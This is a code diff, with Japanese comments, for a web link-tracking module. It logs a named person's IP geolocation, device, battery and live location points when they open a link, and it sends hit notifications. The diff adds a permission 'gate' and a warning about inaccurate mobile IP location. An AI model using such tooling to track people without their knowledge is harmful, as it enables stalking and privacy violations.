@@ -7,9 +7,10 @@ main.py の snsx と同じ場所で include する:
 /l/ 配下はこのモジュールが担当する（main.py の同名ルートより先に登録されるため）。
 認証・render・ヒット記録は main.py 側を遅延参照して使い回すので挙動がズレない。
 
-v3:
-  ・ヒット時に通知（notify）を投げるフックを追加
-  ・mode を全モード受けに（quiz / identify / redirect / geo も作れる）
+v4:
+  ・「要件ゲート」対応（開いた直後は要件だけ見せ、続けるで許可を取る）
+  ・ヒット時に通知（notify）を投げる
+  ・IP推定位置に「4G/5Gは不正確」の警告を付ける
 """
 from __future__ import annotations
 
@@ -41,8 +42,8 @@ LIVE_DEFAULTS = {
     "deny_redirect": False,
     "dest_redirect": True,
     "promote_page": True,
-    "gate": True,          # ★追加
-    "gate_warn": True,     # ★追加
+    "gate": True,          # 要件ゲートを出す
+    "gate_warn": True,     # 要件に「4G/5Gは不正確」を出す
 }
 
 ENV_MAP = {
@@ -56,8 +57,8 @@ ENV_MAP = {
     "deny_redirect": "LIVE_DENY_REDIRECT",
     "dest_redirect": "LIVE_DEST_REDIRECT",
     "promote_page": "PROMOTE_PAGE_TO_LIVE",
-    "gate": "LIVE_GATE",              # ★追加
-    "gate_warn": "LIVE_GATE_WARN",    # ★追加
+    "gate": "LIVE_GATE",
+    "gate_warn": "LIVE_GATE_WARN",
 }
 
 UI_CHOICES = ("", "none", "ask")
@@ -222,6 +223,8 @@ def _tp_row(code, link, ip, p, g, q, kind="pt", sid="", note=""):
         rid = link["rid"] if link and "rid" in link.keys() else None
     except Exception:
         rid = None
+    mob = 1 if (g.get("is_mobile") or linktrack.mobile_guess(
+        g.get("isp") or "", g.get("org") or "", g.get("asn") or "")) else 0
     return {
         "code": code, "link_id": rid,
         "person": (link["person"] or link["name"]) if link else "",
@@ -233,7 +236,9 @@ def _tp_row(code, link, ip, p, g, q, kind="pt", sid="", note=""):
         "region": g.get("region"), "city": g.get("city"),
         "isp": g.get("isp"), "asn": g.get("asn"),
         "device": p.get("device"), "os": p.get("os"), "browser": p.get("browser"),
-        "inapp": p.get("inapp"), "battery": _f(q.get("batt")),
+        "inapp": p.get("inapp"),
+        "mobile": mob, "net": (g.get("isp") or "")[:60],
+        "battery": _f(q.get("batt")),
         "charging": None if chg is None else (1 if chg else 0),
         "screen": str(q.get("scr") or "")[:40], "note": (note or "")[:40],
     }
@@ -247,10 +252,12 @@ def _live_page(request, code, hid, link, nonce):
                   dest=dest, nonce=nonce,
                   iv=_clamp_iv(link["interval"]), maxmin=LIVE_MAX_MIN,
                   ui=ui, ask_text=L["ask_text"], deny_text=L["deny_text"],
-                  retry_text=L["retry_text"], wait_sec=L["wait_sec"],
+                  retry_text=L["retry_text"], go_text=L["go_text"],
+                  wait_sec=L["wait_sec"],
                   dest_redirect=(L["dest_redirect"] and bool(dest)),
                   deny_redirect=(L["deny_redirect"] and bool(dest)),
-                  dest_min=L["dest_min"])
+                  dest_min=L["dest_min"],
+                  gate=bool(L["gate"]), gate_warn=bool(L["gate_warn"]))
 
 
 # ================= 公開ルート（/l/ 配下を引き継ぐ） =================
@@ -265,7 +272,7 @@ def link_hit(code: str, request: Request):
     L = live_cfg()
     hid = _record_hit(request, code)
 
-    # ★ ヒット通知
+    # ヒット通知
     try:
         from . import notify
         notify.hit_async(code, hid, request, link)
@@ -460,6 +467,19 @@ def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
         limit = 1500
     rows = db.points(code, since=since, limit=limit)
     iv = _clamp_iv(link["interval"])
+
+    def _g(r, k, d=None):
+        try:
+            return r[k]
+        except (IndexError, KeyError):
+            return d
+
+    ip_only = sum(1 for r in rows if (_g(r, "src") or "") == "ip")
+    mob = sum(1 for r in rows if _g(r, "mobile"))
+    warn = ""
+    if ip_only:
+        warn = linktrack.IP_WARN + (f"（モバイル回線の点: {mob}件）" if mob else "")
+
     return {
         "person": link["person"] or link["name"], "name": link["name"],
         "dest": link["dest"] or "", "mode": link["mode"],
@@ -470,6 +490,7 @@ def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
                  "ip": link["last_ip"], "src": link["last_src"],
                  "batt": link["last_batt"], "chg": link["last_charging"]},
         "count": db.point_count(code),
+        "ip_only": ip_only, "mobile_points": mob, "warn": warn,
         "sessions": [{"sid": s["sid"], "first": s["first"], "last": s["last"], "n": s["n"]}
                      for s in db.track_sessions(code)],
         "points": [{"id": r["id"], "ts": r["ts"], "lat": r["lat"], "lon": r["lon"],
@@ -523,6 +544,8 @@ async def live_settings_save(request: Request, u=Depends(auth)):
         "deny_redirect": flag("deny_redirect"),
         "dest_redirect": flag("dest_redirect"),
         "promote_page": flag("promote_page"),
+        "gate": flag("gate"),
+        "gate_warn": flag("gate_warn"),
     }
     if data["ui"] not in UI_CHOICES:
         data["ui"] = ""
